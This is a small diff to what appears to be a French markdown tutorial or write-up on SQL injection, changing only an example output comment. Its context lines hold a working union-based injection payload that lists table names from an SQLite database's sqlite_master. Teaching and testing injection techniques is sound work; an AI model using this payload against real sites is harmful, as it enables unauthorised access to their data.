@@ -18,7 +18,7 @@
 ```sh
 ' union select 1, name from sqlite_master where type='table'-- -
 
-# Output : news, users
+# Output : foo, users
 ```
 
 ## Retrouver le format des tables
